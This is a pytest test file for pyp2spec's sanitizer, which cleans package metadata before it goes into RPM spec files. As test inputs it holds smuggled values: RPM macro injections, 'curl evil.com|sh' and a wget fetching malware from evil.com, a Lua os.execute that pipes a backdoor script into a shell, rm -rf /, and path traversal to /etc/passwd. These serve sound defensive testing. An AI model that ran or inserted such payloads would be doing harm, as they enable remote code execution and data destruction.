import pytest

from pyp2spec.sanitizer import sanitize
from pyp2spec.utils import MissingPackageNameError


@pytest.mark.parametrize(
    ("name", "expected"), [
        ("my-package", "my-package"),
        ("pkg%(system id)", "pkg"),
        ("pkg%{version}", "pkg%%{version}"),
        ("pkg\nRelease: evil", "pkgrelease:evil"),
        ("Awesome_TestPkg", "awesome-testpkg"),
        ("python-foo", "python-foo"),
        ("python_foo", "python-foo"),
    ]
)
def test_sanitize_name(name, expected):
    assert sanitize("name", name) == expected


@pytest.mark.parametrize(
    ("name", "expected"), [
        ("my-package-foo", "my_package_foo"),
        ("my.package", "my_package"),
        ("my_package-", "my_package"),
        ("noweirdchars", "noweirdchars"),
    ]
)
def test_sanitize_wheel_name(name, expected):
    assert sanitize("wheel_name", name) == expected


def test_sanitize_name_empty():
    with pytest.raises(MissingPackageNameError):
        sanitize("name", "")


def test_sanitize_wheel_name_empty():
    with pytest.raises(MissingPackageNameError):
        sanitize("wheel_name", "")


@pytest.mark.parametrize(
    ("version", "expected_contains"), [
        ("1.2.3", "1.2.3"),
        ("1.0a1", "1.0a1"),
        ("2.0~rc1", "2.0~rc1"),
    ]
)
def test_sanitize_version_valid(version, expected_contains):
    assert sanitize("version", version) == expected_contains


@pytest.mark.parametrize(
    ("version", "expected"), [
        ("1.0%(system echo hacked)", "1.0"),
        ("1.0\n%prep\nrm -rf", "1.0%%preprm-rf"),
        ("1.0; rm -rf /", "1.0_rm-rf/"),
        ("1.0.0%(system wget http://evil.com/malware -O /tmp/pwn)", "1.0.0")
    ]
)
def test_sanitize_version_removes_dangerous_content(version, expected):
    assert sanitize("version", version) == expected


@pytest.mark.parametrize(
    ("summary", "expected"), [
        ("A Python package", "A Python package"),
        ("Line 1\nLine 2", "Line 1 Line 2"),
    ]
)
def test_sanitize_summary_valid(summary, expected):
    assert sanitize("summary", summary) == expected


@pytest.mark.parametrize(
    ("summary", "expected"), [
        ("Package %(system curl evil.com|sh)", "Package"),
        ("Version %{version} package", "Version %%{version} package"),
        ("Good summary\n%prep\n%{system rm -rf /}", "Good summary %%prep %%{system rm -rf /}"),
        ("Text\x00with\x01control\x1fchars", "Textwithcontrolchars"),
    ]
)
def test_sanitize_summary_removes_dangerous_content(summary, expected):
    assert sanitize("summary", summary) == expected


def test_sanitize_spec_injection_via_summary():
    attack = """Legitimate summary
%prep
%{lua: os.execute("curl evil.com/backdoor.sh | sh")}
"""
    result = sanitize("summary", attack)
    assert "\n" not in result
    assert "%%prep" in result


@pytest.mark.parametrize(
    ("field", "value", "desc"), [
        ("summary", "Package $(whoami)", "command substitution"),
        ("summary", "Tool `id`", "backticks"),
        ("summary", "Package | sh", "pipe"),
        ("summary", "Tool; rm -rf /", "semicolon"),
        ("summary", "Package && id", "double ampersand"),
        ("summary", "Tool & background", "ampersand"),
        ("license", "MIT; touch /tmp/pwn", "license with semicolon"),
        ("summary", "Text >output.txt", "redirect"),
        ("summary", "Read <input.txt", "input redirect"),
        ("summary", "Exec (subshell)", "parentheses"),
        ("summary", "Array [0]", "square brackets"),
        ("summary", "Path \\escape", "backslash"),
        ("summary", "Quote 'test'", "single quotes"),
        ("summary", 'Quote "test"', "double quotes"),
    ]
)
def test_sanitize_generic_removes_shell_metacharacters(field, value, desc):
    """Test that generic sanitization removes shell metacharacters.

    Note: {} are preserved for escaped RPM macros like %%{version}
    """
    result = sanitize(field, value)
    for char in ['$', '`', '|', ';', '&', '<', '>', '(', ')', '[', ']', '\\', "'", '"']:
        assert char not in result, f"Shell metacharacter {char!r} found in: {result}"


@pytest.mark.parametrize(
    ("field", "value", "expected"), [
        ("summary", "Python 包管理工具", "Python 包管理工具"),
        ("summary", "أداة إدارة الحزم", "أداة إدارة الحزم"),
        ("summary", "Pythonパッケージマネージャー", "Pythonパッケージマネージャー"),
        ("license", "Лицензия MIT", "Лицензия MIT"),
        ("summary", "中文描述 with English", "中文描述 with English"),
    ]
)
def test_sanitize_generic_preserves_unicode(field, value, expected):
    """Test that generic sanitization preserves Unicode characters."""
    result = sanitize(field, value)
    assert result == expected


def test_sanitize_generic_combined_attack():
    """Test a complex attack combining multiple shell metacharacters."""
    attack = "Package $(curl evil.com|sh) && `id` ; rm -rf /"
    result = sanitize("summary", attack)
    assert result == "Package __curl evil.com_sh_ __ _id_ _ rm -rf /"


def test_sanitize_generic_preserves_safe_punctuation():
    """Test that safe punctuation is preserved in generic fields."""
    text = "Package v1.0: A tool for testing! Works great? Yes. Cool@feature #1 +more -info"
    result = sanitize("summary", text)
    assert result == "Package v1.0: A tool for testing! Works great? Yes. Cool@feature #1 +more -info"


@pytest.mark.parametrize(
    ("license_str", "expected"), [
        ("MIT", "MIT"),
        ("GPL-3.0-or-later", "GPL-3.0-or-later"),
        ("MIT OR Apache-2.0", "MIT OR Apache-2.0"),
    ]
)
def test_sanitize_license_valid(license_str, expected):
    assert sanitize("license", license_str) == expected


@pytest.mark.parametrize(
    ("license_str", "expected"), [
        ("MIT%(system touch /tmp/pwned)", "MIT"),
        ("MIT\n%prep\nrm -rf /", "MIT %%prep rm -rf /"),
    ]
)
def test_sanitize_license_removes_dangerous_content(license_str, expected):
    assert sanitize("license", license_str) == expected


@pytest.mark.parametrize(
    ("url", "expected"), [
        ("https://example.com/pkg", "https://example.com/pkg"),
    ]
)
def test_sanitize_url_valid(url, expected):
    assert sanitize("url", url) == expected


@pytest.mark.parametrize(
    ("url", "expected"), [
        ("http://evil.com%(system id)", "http://evil.com"),
        ("http://example.com\nBuildRequires: evil", "http://example.comBuildRequires:evil"),
        ("http://example .com/path with spaces", "http://example.com/pathwithspaces"),
        ("https://evil.com/%{buildroot}/etc/shadow", "https://evil.com/%%{buildroot}/etc/shadow")
    ]
)
def test_sanitize_url_dangerous_content(url, expected):
    assert sanitize("url", url) == expected


@pytest.mark.parametrize(
    ("archive_name", "expected"), [
        ("package-1.0.tar.gz", "package-1.0.tar.gz"),
    ]
)
def test_sanitize_archive_name_valid(archive_name, expected):
    assert sanitize("archive_name", archive_name) == expected


@pytest.mark.parametrize(
    ("archive_name", "expected"), [
        ("../../etc/passwd", "passwd"),
        ("pkg-1.0.tar.gz; rm -rf /", "pkg-1.0.tar.gz_rm-rf"),
        ("pkg%(system id).tar.gz", "pkg.tar.gz"),
        ("../../../etc/cron.d/backdoor", "backdoor")
    ]
)
def test_sanitize_archive_name_removes_dangerous_content(archive_name, expected):
    assert sanitize("archive_name", archive_name) == expected


def test_sanitize_extras_valid():
    result = sanitize("extras", ["dev", "test", "docs"])
    assert result == ["dev", "test", "docs"]


def test_sanitize_extras_removes_macros():
    assert sanitize("extras", ["test%(system id)", "dev"]) == ["test", "dev"]


def test_sanitize_extras_filters_empty():
    assert sanitize("extras", ["valid", "", "%(evil)"]) == ["valid"]


@pytest.mark.parametrize(
    ("field", "value", "expected"), [
        ("summary", "...", "..."),
        ("url", "", ""),
        ("archive_name", "", ""),
    ]
)
def test_sanitize_empty_and_none_values(field, value, expected):
    assert sanitize(field, value) == expected


def test_sanitize_multiple_macro_types():
    malicious = "Text %(system id) and %{version} and %%{safe}"
    result = sanitize("summary", malicious)
    assert "%(system" not in result
    assert "%%{version}" in result
    assert "%%{safe}" in result
